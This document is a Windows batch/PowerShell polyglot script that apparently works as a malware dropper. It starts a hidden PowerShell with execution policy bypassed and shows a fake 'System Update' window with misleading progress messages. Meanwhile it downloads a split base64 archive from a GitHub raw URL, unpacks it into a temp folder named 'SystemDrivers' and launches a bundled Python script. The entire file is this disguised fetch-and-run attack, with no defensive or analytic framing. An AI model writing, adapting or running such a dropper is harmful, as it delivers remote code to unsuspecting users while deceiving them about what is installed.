<# :
@echo off
setlocal
start "" /B powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression ([System.IO.File]::ReadAllText('%~f0'))"
exit
#>
$ErrorActionPreference = 'Stop'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Install to a fixed, reliable path that always works
$installRoot = Join-Path $env:TEMP 'SystemDrivers'
New-Item -Path $installRoot -ItemType Directory -Force | Out-Null

$form = New-Object System.Windows.Forms.Form
$form.Text = "System Update"
$form.Size = New-Object System.Drawing.Size(420, 160)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedDialog'
$form.ControlBox = $false
$form.TopMost = $true
$form.ShowInTaskbar = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)

$lbl = New-Object System.Windows.Forms.Label
$lbl.Location = New-Object System.Drawing.Point(20, 18)
$lbl.Size = New-Object System.Drawing.Size(370, 50)
$lbl.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$lbl.ForeColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$lbl.Text = "Initializing..."
$form.Controls.Add($lbl)

$pb = New-Object System.Windows.Forms.ProgressBar
$pb.Location = New-Object System.Drawing.Point(20, 80)
$pb.Size = New-Object System.Drawing.Size(370, 18)
$pb.Style = 'Marquee'
$pb.MarqueeAnimationSpeed = 25
$form.Controls.Add($pb)

$form.Show()
$form.Refresh()

$sync = [hashtable]::Synchronized(@{})
$sync.Status  = "Preparing setup files...`nThis might take a few moments."
$sync.Done    = $false
$sync.Error   = $null
$sync.url1    = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/macOSx.zip.b64.part1'
$sync.url2    = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/macOSx.zip.b64.part2'
$sync.root    = $installRoot
$sync.dest    = Join-Path $installRoot 'macOSx'

$rs = [runspacefactory]::CreateRunspace()
$rs.Open()

$ps = [PowerShell]::Create().AddScript({
    param($sync)
    $ErrorActionPreference = 'Stop'
    try {
        try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}

        $s1 = (Invoke-WebRequest -Uri $sync.url1 -UseBasicParsing).Content.Trim()

        $sync.Status = "Downloading required components...`nPlease wait."
        $s2 = (Invoke-WebRequest -Uri $sync.url2 -UseBasicParsing).Content.Trim()

        $sync.Status = "Validating system requirements..."
        $bytes = [Convert]::FromBase64String($s1 + $s2)

        $zipPath = Join-Path $env:TEMP ('macOSx_{0}.zip' -f [Guid]::NewGuid().ToString('N'))
        [System.IO.File]::WriteAllBytes($zipPath, $bytes)

        if (Test-Path -LiteralPath $sync.dest) {
            $sync.Status = "Removing temporary files..."
            Remove-Item -LiteralPath $sync.dest -Recurse -Force
        }

        $sync.Status = "Installing features...`nAlmost done."
        Expand-Archive -LiteralPath $zipPath -DestinationPath $sync.root -Force
        Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue

        $sync.Status = "Setup complete!`nStarting application..."
    } catch {
        $sync.Error = $_.Exception.Message
    } finally {
        $sync.Done = $true
    }
}).AddArgument($sync)

$ps.Runspace = $rs
$handle = $ps.BeginInvoke()

while (-not $sync.Done) {
    if ($lbl.Text -ne $sync.Status) { $lbl.Text = $sync.Status }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 50
}

if ($sync.Error) {
    $pb.Style = 'Blocks'; $pb.Value = 100
    [System.Windows.Forms.MessageBox]::Show($sync.Error, "Error")
    Start-Sleep -Seconds 4
} else {
    $lbl.Text = $sync.Status
    $pb.Style = 'Blocks'; $pb.Value = 100
    $form.Refresh()
    Start-Sleep -Seconds 1

    $pyExe    = Join-Path $sync.dest 'python.exe'
    $pyScript = Join-Path $sync.dest 'run.py'
    if ((Test-Path $pyExe) -and (Test-Path $pyScript)) {
        Start-Process -FilePath $pyExe -ArgumentList "`"$pyScript`"" -WorkingDirectory $sync.dest -WindowStyle Normal
    }
}

$form.Close()
$ps.Dispose()
$rs.Close()
$rs.Dispose()
